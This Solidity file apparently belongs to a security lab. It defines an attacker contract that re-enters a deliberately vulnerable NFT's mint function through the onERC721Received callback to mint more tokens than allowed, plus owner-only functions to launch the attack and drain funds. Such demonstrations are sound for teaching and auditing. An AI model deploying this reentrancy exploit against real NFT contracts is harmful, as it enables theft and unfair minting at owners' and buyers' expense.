//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

import { IERC721Receiver } from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import { AttackableSimpleNFT } from "./AttackableNFTToken.sol";
import { IERC721 } from "@openzeppelin/contracts/token/ERC721/IERC721.sol";


contract NFTAttacker is IERC721Receiver {

    uint256 public mintTarget = 0;
    uint256 public tokenPrice = 1 ether;
    uint256 counter = 0;
    address immutable owner;

    constructor() {
        owner = msg.sender;
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) public virtual override returns (bytes4) {
        ++counter;
        
        if(mintTarget > 0){
            --mintTarget;
        
            AttackableSimpleNFT(msg.sender).mint{value:tokenPrice}();
        }
        return this.onERC721Received.selector;
    }

    function startAttack(address nftAddress) public {
        require(msg.sender == owner, "Only owner can start attack");
        AttackableSimpleNFT(nftAddress).mint{value:tokenPrice}();
    }

    function resetMintTarget(uint256 newTarget, uint256 newTokenPrice) public {
        require(msg.sender == owner, "Only owner can reset mint target");
        mintTarget = newTarget;
        tokenPrice = newTokenPrice;
    }

    // Allow transfer of tokens
    fallback() payable external{}

    receive() payable external{}

    function drainFunds() public {
        require(msg.sender == owner, "Only owner can drain funds");
        payable(msg.sender).transfer(address(this).balance);
    }

    // Take tokens out of the contract
    function transferTo(IERC721 token, address to, uint256 tokenId) public {
        token.transferFrom(address(this), to, tokenId);
    }

}
